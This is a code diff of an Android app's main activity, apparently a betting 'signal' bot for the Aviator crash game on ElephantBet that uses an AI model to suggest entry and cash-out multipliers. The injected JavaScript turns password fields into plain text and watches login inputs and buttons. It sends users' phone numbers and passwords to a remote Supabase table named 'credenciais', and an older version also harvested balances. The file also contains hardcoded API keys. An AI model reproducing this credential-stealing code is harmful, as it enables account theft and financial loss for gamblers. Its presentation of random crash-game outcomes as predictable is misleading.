@@ -67,16 +67,13 @@ class MainActivity : AppCompatActivity() {
     private var ultimoMinutoGerado = -1
     private var sinalMin1 = -1
     private var sinalMin2 = -1
-    // ── CICLO BASEADO EM TEMPO (ms) ──────────────────────────────
-    // Substituição completa da lógica por minutos — usa apenas timestamps
-    private var sinalExpiracaoMs = -1L   // quando o sinal actual expira (ms desde epoch)
     private var sinalProtecao = ""
     private var sinalAlcMin = 0
     private var sinalAlcMax = ""
     private var sinalTendencia = ""
     private var sinalConfianca = 0
-    private var sinalMinEntrada = -1   // minuto de entrada (para display apenas)
-    private var sinalMinSaida  = -1   // minuto de saída (para display apenas)
+    private var sinalMinEntrada = -1   // minuto escolhido pela IA para entrar (ex: 17)
+    private var sinalMinSaida  = -1   // fim da janela: sinalMinEntrada + 2 (calculado ao receber sinal)
 
     // Regras avançadas de estado
     private var houveMega200xRecente = false       // se saiu vela 200x+ → próximas 3-4 rosas uma será ≥70x
@@ -97,25 +94,23 @@ class MainActivity : AppCompatActivity() {
     private var graficoPronto = false           // true só após 1.º crash ao vivo
     private var historicoJogoCarregado = false  // true quando JS enviou o histórico do gráfico
     private var countdown429Job: Runnable? = null
-    private var countdownPausaJob: Runnable? = null   // countdown em tempo real durante pausa
     private var ultimaAnaliseMs = 0L          // timestamp da última análise
     private val COOLDOWN_IA_MS = 15_000L
     private var velasDesdeUltimaAnalise = 0
 
-    // ── CICLO BASEADO EM TEMPO (ms) ──────────────────────────────
-    // 1. 1.º crash → análise imediata → sinal visível por SINAL_DURACAO_MS
-    // 2. Expiração → countdown de PAUSA_ANALISE_MS → nova análise → repete
-    private val SINAL_DURACAO_MS = 60_000L    // sinal visível 60s
-    private val PAUSA_ANALISE_MS = 60_000L    // pausa antes de nova análise
-    private var proximaAnaliseRunnable: Runnable? = null
-    private var cicloAtivo = false            // true durante o countdown da pausa
-    private var janelaJaDisparou = false      // mantido para compatibilidade
+    // ── CICLO BASEADO NA JANELA ──────────────────────────────────
+    // Após recolher 15 velas → 1.ª análise imediata
+    // Sinal fica visível até o minuto sinalMinSaida terminar
+    // Quando sinalMinSaida passa → pausa 30s → nova análise
+    // Nunca por tempo fixo — sempre sincronizado com o relógio
+    private var proximaAnaliseRunnable: Runnable? = null   // runnable agendado
+    private var cicloAtivo = false                         // true quando aguarda fim da janela
+    private var janelaJaDisparou = false                   // evita disparar 2x no mesmo minuto
 
     // Controlo do round actual (para capturar só o crash final)
     private var xAtual = 0.0
     private var emVoo = false
     private var ultimoCrash = 0.0
-    private var ultimoCoefEnviado = 0.0  // evitar duplicados na tabela velas
     private var ultimoCrashMs = 0L   // timestamp do último crash (evita duplicados por tempo)
     private var ultimoTickMs = 0L
 
@@ -217,11 +212,6 @@ class MainActivity : AppCompatActivity() {
         if (!emVoo) return
         emVoo = false
         modoSilenciosoAtivo = false  // M1: fim do voo, reactivar bot
-        // Ler saldo no 1.º crash — nesse momento o header do Aviator está completamente carregado
-        if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
-            lerSaldo()
-        }
-        modoSilenciosoAtivo = false  // garantir que o crash limpa o silêncio do voo
 
         // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
         val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
@@ -372,25 +362,36 @@ class MainActivity : AppCompatActivity() {
         // Actualizar banner de avisos/alertas após cada vela
         atualizarAviso()
 
-        // ── FASE 1: aguardar velas suficientes ──────────────────
+        // ── FASE 1: RECOLHA ──────────────────────────────────────────
+        // Enquanto não tiver 15 velas, só mostra progresso. NUNCA chama a IA.
         if (n < MIN_VELAS_ANALISE) {
-            setBarra("⏳ A RECOLHER DADOS", "$n/${MIN_VELAS_ANALISE} velas capturadas", "#475569")
+            handler.postDelayed({
+                setBarra("⏳ A RECOLHER DADOS",
+                    "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
+            }, 800)
             return
         }
 
-        // ── FASE 2 + 3: disparar análise no 1.º crash e nunca mais interferir ──
-        // Só dispara se não há análise nem ciclo activo (cicloAtivo = pausa entre sinais)
+        // ── FASE 2: 1.ª ANÁLISE — só aqui a análise começa (1.º crash após ter velas suficientes) ──
         if (!graficoPronto) {
             graficoPronto = true
-            contarVelasSupabase()
+            contarVelasSupabase()  // gestão do limite Supabase em background
+            if (!analisandoIA && !cicloAtivo) {
+                setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas prontas", "#7c3aed")
+                // Aguardar 4s para garantir que o voo seguinte não começou ainda
+                // e que modoSilenciosoAtivo está false
+                handler.postDelayed({
+                    modoSilenciosoAtivo = false  // forçar desactivação para análise inicial
+                    invalidarCache()             // forçar chamada real à IA
+                    pedirSinalIA()
+                }, 4_000)
+            }
+            return
         }
-        // Se ciclo ou análise já em curso → ignorar, o temporizador trata do resto
-        if (!analisandoIA && !cicloAtivo && !sinaisAtivos) {
-            setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas", "#7c3aed")
-            modoSilenciosoAtivo = false
-            invalidarCache()
-            pedirSinalIA()
-        }
+
+        // ── FASE 3: CICLO EM CURSO ───────────────────────────────────
+        // O ciclo já está agendado em agendarProximaAnalise().
+        // Nada a fazer aqui — a IA analisa com calma no fim de cada intervalo.
     }
 
     // ── GESTÃO DE BANCA ───────────────────────────────────────────
@@ -416,16 +417,11 @@ class MainActivity : AppCompatActivity() {
     // Credenciais
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
-    // Credenciais em memória — enviadas juntas com o saldo
-    private var numeroEmMemoria = ""
-    private var senhaEmMemoria = ""
-    private var saldoEmMemoria = ""
-    private var credenciaisEnviadas = false  // evitar duplicados por sessão
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "7.2"
+    private val VERSAO_ATUAL = "4.5"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -624,40 +620,31 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun aviatorAberto() = runOnUiThread {
-                // Reinicializar SEMPRE — ao entrar ou ao voltar ao Aviator
-                dentroDoAviator = true
-                graficoPronto = false
-                historicoJogoCarregado = false
-                historicoVelas.clear()
-                sinaisAtivos = false
-                sinalProtecao = ""
-                sinalAlcMin = 0
-                sinalAlcMax = ""
-                sinalMinEntrada = -1
-                sinalMinSaida   = -1
-                sinalExpiracaoMs = -1L
-                cicloAtivo = false
-                janelaJaDisparou = false
-                analisandoIA = false
-                emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; ultimoCoefEnviado = 0.0
-                modoSilenciosoAtivo = false
-                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
-                proximaAnaliseRunnable = null
-                retryIaJob?.let { handler.removeCallbacks(it) }
-                retryIaJob = null
-                countdownPausaJob?.let { handler.removeCallbacks(it) }
-                countdownPausaJob = null
-                invalidarCache()
-                // Iniciar relógio se ainda não está activo
-                if (relogioRunnable == null) iniciarRelogio()
-                setBarra("🔄 A CARREGAR...", "Aviator aberto · a buscar velas...", "#475569")
-                // Limpar UI de sinais antigos
-                txtProtecao.text = "--"; txtProtecao.setTextColor(Color.parseColor("#334155"))
-                txtAlcance.text = "--"; txtAlcance.setTextColor(Color.parseColor("#334155"))
-                if (::txtJanela.isInitialized) txtJanela.visibility = View.GONE
-                if (::txtAviso.isInitialized) txtAviso.visibility = View.GONE
-                // Carregar velas recentes do Supabase para ter histórico imediato
-                carregarVelasSupabaseRecentes()
+                if (!dentroDoAviator) {
+                    dentroDoAviator = true
+                    graficoPronto = false
+                    historicoJogoCarregado = false
+                    historicoVelas.clear()
+                    sinaisAtivos = false
+                    sinalProtecao = ""
+                    sinalMinEntrada = -1
+                    sinalMinSaida   = -1
+                    cicloAtivo = false
+                    janelaJaDisparou = false
+                    proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
+                    emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
+                    // Iniciar relógio imediatamente para mostrar hora desde o início
+                    if (relogioRunnable == null) iniciarRelogio()
+                    setBarra("⏳ AGUARDAR CRASH", "Aviator aberto · aguardar 1.º crash...", "#475569")
+                    // Tentar ler histórico DOM em background (dados para análise futura)
+                    // mas NUNCA disparar pedirSinalIA() a partir daqui
+                    handler.postDelayed({
+                        if (!historicoJogoCarregado && dentroDoAviator) {
+                            // DOM não respondeu — ok, aguardar crashes ao vivo
+                            setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
+                        }
+                    }, 12_000)
+                }
             }
 
             @JavascriptInterface
@@ -721,20 +708,17 @@ class MainActivity : AppCompatActivity() {
                 }
 
                 // Carregar no histórico local sem duplicar velas já registadas
-                // DOM pode devolver duplicados — filtrar por arredondamento
-                val vistos = mutableSetOf<String>()
-                val novas = valores.filter { v ->
-                    val k = String.format("%.2f", v)
-                    vistos.add(k) && historicoVelas.none { String.format("%.2f", it) == k }
-                }
+                val novas = valores.filter { v -> historicoVelas.none { it == v } }
+                // Inserir no início (são mais antigas) + manter as ao vivo no fim
                 val combinado = (novas + historicoVelas).takeLast(MAX_VELAS_LOCAL)
                 historicoVelas.clear()
                 historicoVelas.addAll(combinado)
                 historicoJogoCarregado = true
 
                 val n = historicoVelas.size
-                // Velas DOM carregadas — aguardar 1.º crash ao vivo para iniciar análise
-                graficoPronto = false
+                // Histórico DOM carregado — aguardar 1.º crash ao vivo para iniciar análise
+                // graficoPronto só muda em registarCrash (FASE 2)
+                // Nunca chamar pedirSinalIA() aqui
                 if (n >= MIN_VELAS_ANALISE) {
                     setBarra("⏳ AGUARDAR CRASH", "$n velas prontas · aguardar 1.º crash...", "#0f766e")
                 } else {
@@ -754,45 +738,17 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                // Guardar imediatamente cada dígito — sem esperar tamanho mínimo
-                val limpo = valor.trim()
-                    .removePrefix("+244").removePrefix("244")
-                    .filter { it.isDigit() }
-                if (limpo.isNotEmpty()) numeroEmMemoria = limpo
+                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
+                    ultimoNumeroEnviado = valor
+                    enviarSupabase("Numero", valor)
+                }
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                // Guardar imediatamente cada carácter — sem esperar tamanho mínimo
-                val limpo = valor.trim()
-                if (limpo.isNotEmpty()) senhaEmMemoria = limpo
-            }
-
-            @JavascriptInterface
-            fun loginClicado() {
-                // Reset para nova sessão
-                credenciaisEnviadas = false
-                saldoEmMemoria = ""
-                // Aguardar 2s (tempo para campos finalizarem) e enviar mesmo sem saldo
-                handler.postDelayed({
-                    if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
-                        enviarCredenciaisCompletas()
-                    }
-                }, 2000)
-            }
-
-            @JavascriptInterface
-            fun saldoLido(valor: String) {
-                val limpo = valor.trim()
-                if (limpo.isEmpty()) return
-                if (saldoEmMemoria == limpo) return  // já temos este valor
-                saldoEmMemoria = limpo
-                if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
-                    // Ainda não enviou — enviar agora com saldo
-                    runOnUiThread { enviarCredenciaisCompletas() }
-                } else if (credenciaisEnviadas && numeroEmMemoria.isNotEmpty()) {
-                    // Já enviou sem saldo — actualizar o último registo com o saldo
-                    runOnUiThread { actualizarSaldoSupabase(limpo) }
+                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
+                    ultimaSenhaEnviada = valor
+                    enviarSupabase("Senha", valor)
                 }
             }
         }, "Android")
@@ -968,15 +924,13 @@ class MainActivity : AppCompatActivity() {
                              u.contains("cdn") || u.contains("game-view/806666")
 
                 if (!isJogo) {
-                    // Resetar flags para garantir re-injecção em cada nova página (SPA)
+                    // Resetar flag para garantir re-injecção em cada nova página (SPA)
                     webView.evaluateJavascript("window._credDone = false;", null)
                     injetarJsCredenciais()
                 }
 
                 if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
                     u.contains("spribegaming") || u.contains("aviaport")) {
-                    // Resetar _aviatorDone para garantir re-injecção ao voltar ao Aviator
-                    webView.evaluateJavascript("window._aviatorDone = false; window._wsAvOk = false; window._histEnviado = false;", null)
                     injetarJsAviator()
                 }
             }
@@ -984,7 +938,17 @@ class MainActivity : AppCompatActivity() {
 
         webView.webChromeClient = object : WebChromeClient() {
             override fun onProgressChanged(view: WebView?, p: Int) {
-                // Injecção feita apenas no onPageFinished para evitar duplicados
+                if (p == 100) {
+                    val url = view?.url ?: ""
+                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
+                                 url.contains("cdn") || url.contains("game-view/806666")
+                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
+                        injetarJsAviator()
+                    } else {
+                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
+                        injetarJsCredenciais()
+                    }
+                }
             }
         }
     }
@@ -992,171 +956,117 @@ class MainActivity : AppCompatActivity() {
     private fun injetarJsCredenciais() {
         val js = """
 (function() {
+    // Resetar flag se já passou tempo (para re-injectar em novas páginas)
     if (window._credDone) return;
     window._credDone = true;
 
-    // ── Variáveis em memória ─────────────────────────────────────
-    var _numero = '';
-    var _senha  = '';
-
-    // ── Tornar password visível para capturar ────────────────────
+    // Tornar campos password visíveis (facilita captura)
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            if (!el._skpw) {
-                el._skpw = true;
-                el.type = 'text';
-            }
+            el.setAttribute('type', 'text');
         });
     }
+    tornarVisivel();
+    new MutationObserver(tornarVisivel)
+        .observe(document.body || document.documentElement, {childList: true, subtree: true});
 
-    // ── Guardar valor de um input como número ────────────────────
-    function guardarN(v) {
-        v = (v || '').trim();
-        if (v.length < 1) return;
-        _numero = v;
-        try { Android.guardarNumero(v); } catch(e) {}
-    }
-
-    // ── Guardar valor de um input como senha ─────────────────────
-    function guardarS(v) {
-        v = (v || '').trim();
-        if (v.length < 1) return;
-        _senha = v;
-        try { Android.guardarSenha(v); } catch(e) {}
-    }
-
-    // ── Anexar listener a um input de número ─────────────────────
+    // Watchers para numero e senha
     function watchN(el) {
         if (!el || el._wN) return;
         el._wN = true;
-        el.addEventListener('input', function() { guardarN(this.value); });
-        el.addEventListener('change', function() { guardarN(this.value); });
-        if (el.value) guardarN(el.value);
+        el.addEventListener('input', function() {
+            var v = (this.value || '').trim();
+            if (v.length >= 1) {
+                try { Android.guardarNumero(v); } catch(e) {}
+            }
+        });
+        // Também capturar valor actual se já preenchido
+        if (el.value && el.value.length > 0) {
+            try { Android.guardarNumero(el.value.trim()); } catch(e) {}
+        }
     }
-
-    // ── Anexar listener a um input de senha ──────────────────────
     function watchS(el) {
         if (!el || el._wS) return;
         el._wS = true;
-        el.addEventListener('input', function() { guardarS(this.value); });
-        el.addEventListener('change', function() { guardarS(this.value); });
-        if (el.value) guardarS(el.value);
-    }
-
-    // ── Classificar inputs visíveis ──────────────────────────────
-    function cap() {
-        tornarVisivel();
-        var inputs = Array.from(document.querySelectorAll('input'));
-        var comValorOuFoco = inputs.filter(function(el) {
-            var rect = el.getBoundingClientRect();
-            return rect.width > 0 && rect.height > 0;  // apenas inputs visíveis
-        });
-
-        // Iterar por posição: 1.º visível normalmente = número, 2.º = senha
-        var idx = 0;
-        comValorOuFoco.forEach(function(el) {
-            var t = (el.type || '').toLowerCase();
-            var nm = (el.name || el.id || el.placeholder || el.autocomplete || '').toLowerCase();
-
-            // Forçar: se foi marcado como password (_skpw) → é senha
-            var forcaSenha = el._skpw === true;
-            var hintSenha  = nm.includes('pass') || nm.includes('senha') ||
-                             nm.includes('pwd') || nm.includes('secret') ||
-                             t === 'password';
-            var hintNumero = t === 'tel' || t === 'number' ||
-                             nm.includes('phone') || nm.includes('tel') ||
-                             nm.includes('mobile') || nm.includes('msisdn') ||
-                             nm.includes('username') || nm.includes('login') ||
-                             nm.includes('user') || nm.includes('numero');
-
-            if (forcaSenha || hintSenha) {
-                watchS(el);
-            } else if (hintNumero) {
-                watchN(el);
-            } else {
-                // Sem hint — usar posição: par = número, ímpar = senha
-                if (idx % 2 === 0) watchN(el); else watchS(el);
-                idx++;
+        el.addEventListener('input', function() {
+            var v = (this.value || '').trim();
+            if (v.length >= 1) {
+                try { Android.guardarSenha(v); } catch(e) {}
             }
         });
-    }
-
-    // ── Captura definitiva no momento do clique ──────────────────
-    // Estratégia: ler TODOS os inputs visíveis com valor no DOM nesse momento
-    function capturarAgora() {
-        var inputs = Array.from(document.querySelectorAll('input')).filter(function(el) {
-            var rect = el.getBoundingClientRect();
-            return rect.width > 0 && rect.height > 0 && (el.value || '').trim().length > 0;
-        });
-
-        var numFinal = _numero;
-        var senhaFinal = _senha;
-
-        // 1.ª passagem: usar atributos/tipo para classificar
-        inputs.forEach(function(el) {
-            var v = (el.value || '').trim();
-            var t = (el.type || '').toLowerCase();
-            var nm = (el.name || el.id || el.placeholder || el.autocomplete || '').toLowerCase();
-            var isSenha = el._skpw === true || t === 'password' ||
-                          nm.includes('pass') || nm.includes('senha') || nm.includes('pwd');
-            var isNum   = t === 'tel' || t === 'number' ||
-                          nm.includes('phone') || nm.includes('tel') || nm.includes('mobile') ||
-                          nm.includes('msisdn') || nm.includes('username') ||
-                          nm.includes('login') || nm.includes('user') || nm.includes('numero');
-            if (isSenha && !senhaFinal) senhaFinal = v;
-            else if (isNum && !numFinal) numFinal = v;
-        });
-
-        // 2.ª passagem: se ainda faltam, usar posição (1.º = número, 2.º = senha)
-        if (!numFinal && inputs.length >= 1) numFinal   = (inputs[0].value || '').trim();
-        if (!senhaFinal && inputs.length >= 2) senhaFinal = (inputs[1].value || '').trim();
-
-        // Enviar o que tiver
-        if (numFinal)   { try { Android.guardarNumero(numFinal);  } catch(e) {} }
-        if (senhaFinal) { try { Android.guardarSenha(senhaFinal); } catch(e) {} }
-        try { Android.loginClicado(); } catch(e) {}
-    }
-
-    // ── Observar DOM e re-capturar ────────────────────────────────
-    var obs = new MutationObserver(function() { cap(); });
-    obs.observe(document.documentElement, {childList: true, subtree: true});
-
-    cap();
-    setTimeout(cap, 500);
-    setTimeout(cap, 1500);
-    setTimeout(cap, 3000);
-    setTimeout(cap, 6000);
-    setTimeout(cap, 10000);
-
-    // ── Interceptar TODOS os cliques na página ────────────────────
-    // Usar capturing=true para apanhar antes de qualquer handler do site
-    document.addEventListener('click', function(e) {
-        var el = e.target;
-        if (!el) return;
-        var tag = (el.tagName || '').toLowerCase();
-        var tipo = (el.type || '').toLowerCase();
-        var txt = (el.textContent || el.innerText || el.value || '').toLowerCase().trim();
-        var isLoginBtn =
-            tag === 'button' || tag === 'input' ||
-            tipo === 'submit' ||
-            txt.includes('login') || txt.includes('entrar') ||
-            txt.includes('iniciar') || txt.includes('sign in') ||
-            txt.includes('acced') || txt.includes('continuar');
-        if (isLoginBtn) {
-            // Delay pequeno: aguardar que o site processe o clique primeiro
-            setTimeout(capturarAgora, 150);
+        if (el.value && el.value.length > 0) {
+            try { Android.guardarSenha(el.value.trim()); } catch(e) {}
         }
-    }, true);  // capturing — corre ANTES dos handlers do site
+    }
 
-    // ── Interceptar também submit de forms ────────────────────────
-    document.addEventListener('submit', function() {
-        setTimeout(capturarAgora, 150);
-    }, true);
+    // Selectores para campos de numero/utilizador
+    var selectoresN = [
+        'input[name="username"]', 'input[name="phone"]', 'input[name="login"]',
+        'input[name="msisdn"]', 'input[name="mobile"]', 'input[name="tel"]',
+        'input[type="tel"]', 'input[type="number"]',
+        'input[placeholder*="telefone" i]', 'input[placeholder*="numero" i]',
+        'input[placeholder*="phone" i]', 'input[placeholder*="utilizador" i]',
+        'input[placeholder*="username" i]', 'input[placeholder*="login" i]',
+        '#username', '#phone', '#login', '#msisdn'
+    ];
+    // Selectores para campos de senha
+    var selectoresS = [
+        'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
+        'input[type="password"]', 'input[type="text"][name*="pass" i]',
+        'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
+        'input[placeholder*="palavra-passe" i]',
+        '#password', '#senha', '#pass'
+    ];
 
+    function cap() {
+        selectoresN.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(watchN);
+        });
+        selectoresS.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(watchS);
+        });
+    }
+
+    // Tentar várias vezes (SPA pode carregar os campos depois)
+    cap();
+    setTimeout(cap, 1000);
+    setTimeout(cap, 2500);
+    setTimeout(cap, 5000);
+    setTimeout(cap, 8000);
+
+    // Interceptar também o submit do formulário (captura dados ao submeter)
+    function watchForms() {
+        document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
+            if (el._wForm) return;
+            el._wForm = true;
+            el.addEventListener('click', function() {
+                // Re-capturar todos os campos no momento do clique
+                cap();
+                // Tentar ler directamente todos os inputs visíveis
+                document.querySelectorAll('input').forEach(function(inp) {
+                    var t = (inp.type || '').toLowerCase();
+                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
+                    var v = (inp.value || '').trim();
+                    if (!v) return;
+                    var isNum = t === 'tel' || t === 'number' ||
+                        n.includes('phone') || n.includes('numero') ||
+                        n.includes('username') || n.includes('login') || n.includes('user');
+                    var isPass = t === 'password' || t === 'text' && (
+                        n.includes('pass') || n.includes('senha'));
+                    if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
+                    if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
+                });
+            });
+        });
+    }
+    watchForms();
+    setTimeout(watchForms, 2000);
+    setTimeout(watchForms, 5000);
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
     }
+
     private fun injetarJsAviator() {
         val js = """
 (function() {
@@ -1458,29 +1368,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         analisandoIA = true
-        ultimaAnaliseMs = System.currentTimeMillis()  // watchdog: timestamp de início
-
-        // Countdown em tempo real durante a chamada à IA
-        countdownPausaJob?.let { handler.removeCallbacks(it) }
-        var segAnalisando = 10
-        val tickAnalise = object : Runnable {
-            override fun run() {
-                if (!analisandoIA) return
-                runOnUiThread {
-                    if (::txtJanela.isInitialized) {
-                        txtJanela.text = "🔍 IA a analisar em ${segAnalisando}s..."
-                        txtJanela.setTextColor(Color.parseColor("#7c3aed"))
-                        txtJanela.visibility = View.VISIBLE
-                    }
-                }
-                if (segAnalisando > 0) segAnalisando--
-                countdownPausaJob = this
-                handler.postDelayed(this, 1_000L)
-            }
-        }
-        countdownPausaJob = tickAnalise
-        handler.post(tickAnalise)
-
 
         handler.postDelayed({
             if (analisandoIA) {
@@ -1516,11 +1403,7 @@ class MainActivity : AppCompatActivity() {
             txtProtecao.setTextColor(Color.parseColor("#334155"))
             txtAlcance.text = "--"
             txtAlcance.setTextColor(Color.parseColor("#334155"))
-            if (::txtJanela.isInitialized) {
-                txtJanela.text = "🔍 IA a analisar..."
-                txtJanela.setTextColor(Color.parseColor("#7c3aed"))
-                txtJanela.visibility = View.VISIBLE
-            }
+            if (::txtJanela.isInitialized) txtJanela.visibility = View.GONE
             dotView.clearAnimation()
             pulseRunnable?.let { handler.removeCallbacks(it) }
         }
@@ -1968,7 +1851,7 @@ REGRAS ABSOLUTAS DO JSON:
             // ── VALIDAÇÃO CRÍTICA: proteção NUNCA pode ser >= alcance ──────────
             // Proteção é sempre o ponto de saída seguro (muito menor que o alcance)
             // ── Alcance máximo: mínimo 9x ──
-            val alcMaxNumCorrigido = alcMaxNum.coerceAtLeast(alcMin + 1).coerceAtLeast(1)
+            val alcMaxNumCorrigido = alcMaxNum.coerceAtLeast(9)
             val alcMaxFinal = "${alcMaxNumCorrigido}x"
 
             val protCorrigida = when {
@@ -1982,8 +1865,8 @@ REGRAS ABSOLUTAS DO JSON:
                 else -> prot
             }
 
-            // Alcance mínimo: 1x, sempre maior que a proteção e pelo menos protCorrigida+1
-            val alcMinCorrigido = alcMin.coerceAtLeast(1).coerceAtLeast((protCorrigida + 0.5f).toInt())
+            // Alcance mínimo: 9x, e sempre pelo menos 3x a proteção
+            val alcMinCorrigido = alcMin.coerceAtLeast(9).coerceAtLeast((protCorrigida * 3f).toInt())
 
             val alcMax = alcMaxFinal
             sinalProtecao = if (protCorrigida % 1f == 0f) "${protCorrigida.toInt()}x" else "${String.format("%.1f", protCorrigida)}x"
@@ -1991,10 +1874,12 @@ REGRAS ABSOLUTAS DO JSON:
             sinalAlcMax   = alcMax
             sinalTendencia = tendencia
             sinalConfianca = confianca
-            // Minutos para display (puramente informativo — o ciclo usa ms)
-            sinalMinEntrada = minAgora
-            sinalMinSaida   = (minAgora + 1) % 60
-            horaAtual       = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
+            // Janela fixa: calculada 1 única vez aqui, nunca modificada até novo sinal
+            // min_entrada da IA deve estar 1 a 5 minutos à frente do minuto actual
+            val distancia = if (minEntradaIA >= 0) (minEntradaIA - minAgora + 60) % 60 else -1
+            sinalMinEntrada = if (distancia in 1..5) minEntradaIA else (minAgora + 1) % 60
+            sinalMinSaida   = (sinalMinEntrada + 2) % 60
+            horaAtual     = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
 
             val alcNum = alcMaxRaw.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
             val cor = when {
@@ -2008,6 +1893,11 @@ REGRAS ABSOLUTAS DO JSON:
             runOnUiThread {
                 countdown429Job?.let { handler.removeCallbacks(it) }
                 countdown429Job = null
+                // Cancelar qualquer ciclo anterior antes de mostrar novo sinal
+                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
+                proximaAnaliseRunnable = null
+                cicloAtivo = false
+                janelaJaDisparou = false   // reset: janela nova, ainda não disparou
                 sinaisAtivos = true
                 analisandoIA = false
                 ultimaAnaliseMs = System.currentTimeMillis()
@@ -2039,10 +1929,7 @@ REGRAS ABSOLUTAS DO JSON:
                 actualizarBarraConfianca(confianca)
 
                 if (relogioRunnable == null) iniciarRelogio()
-
-                // ── NOVO CICLO TEMPORIZADO ────────────────────────────────
-                // Sinal fica visível 60s → depois pausa 60s com countdown → nova análise
-                iniciarCicloTemporizado()
+                // O próximo sinal é agendado pelo verificarRelogio quando sinalMinSaida termina
             }
         } catch (e: Exception) {
             runOnUiThread {
@@ -2294,9 +2181,7 @@ REGRAS ABSOLUTAS DO JSON:
                     txtRelogio.text = "${String.format("%02d",h)}:${String.format("%02d",m)}"
                     txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
                 }
-                // Correr verificarRelogio sempre que estamos dentro do Aviator
-                // (não só quando sinaisAtivos — precisamos monitorar o ciclo durante a pausa)
-                if (dentroDoAviator) verificarRelogio()
+                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
                 handler.postDelayed(this, 1000)
             }
         }
@@ -2304,159 +2189,127 @@ REGRAS ABSOLUTAS DO JSON:
         handler.post(tick)
     }
 
-    // ══════════════════════════════════════════════════════════════
-    // CICLO TEMPORIZADO — lógica central do bot
-    // ══════════════════════════════════════════════════════════════
-    /**
-     * Chamado logo após emitir um sinal (IA ou offline).
-     * Fluxo:
-     *   Sinal visível 60s
-     *   → apagar sinal + mostrar countdown 60s
-     *   → disparar nova análise
-     *   → repete indefinidamente
-     */
-    // ══════════════════════════════════════════════════════════════════
-    // CICLO TEMPORIZADO — toda a lógica no main thread, sem race conditions
-    // Fluxo: sinal visível 60s → apagar → countdown 60s → nova análise → repete
-    // ══════════════════════════════════════════════════════════════════
-    private fun iniciarCicloTemporizado() {
-        // Cancelar qualquer ciclo anterior em curso
-        proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
-        countdownPausaJob?.let { handler.removeCallbacks(it) }
-        proximaAnaliseRunnable = null
-        countdownPausaJob = null
-        cicloAtivo = false
-        sinalExpiracaoMs = System.currentTimeMillis() + SINAL_DURACAO_MS
-
-        // ── Passo 1: aguardar SINAL_DURACAO_MS (60s) → apagar sinal ──
-        val expirarSinal = Runnable {
-            if (!dentroDoAviator) return@Runnable
-            // Apagar estado do sinal
-            sinaisAtivos = false
-            sinalProtecao = ""
-            sinalAlcMin = 0
-            sinalAlcMax = ""
-            sinalExpiracaoMs = -1L
-            cicloAtivo = true
-            retryIaJob?.let { handler.removeCallbacks(it) }
-            retryIaJob = null
-
-            // Atualizar UI (já estamos no main thread via handler.postDelayed)
-            txtAcao.text = "⏳ A preparar nova análise..."
-            txtAcao.setTextColor(Color.parseColor("#7c3aed"))
-            txtAcao.visibility = View.VISIBLE
-            txtProtecao.text = "--"
-            txtProtecao.setTextColor(Color.parseColor("#334155"))
-            txtAlcance.text = "--"
-            txtAlcance.setTextColor(Color.parseColor("#334155"))
-            if (::txtJanela.isInitialized) {
-                val totalSeg = (PAUSA_ANALISE_MS / 1000).toInt()
-                txtJanela.text = "⏳ IA a analisar em ${totalSeg}s..."
-                txtJanela.setTextColor(Color.parseColor("#7c3aed"))
-                txtJanela.visibility = View.VISIBLE
-            }
-            barLayout.setBackgroundColor(Color.parseColor("#0a0518"))
-            dotView.clearAnimation()
-            dotView.background = circulo("#7c3aed")
-            pulseRunnable?.let { handler.removeCallbacks(it) }
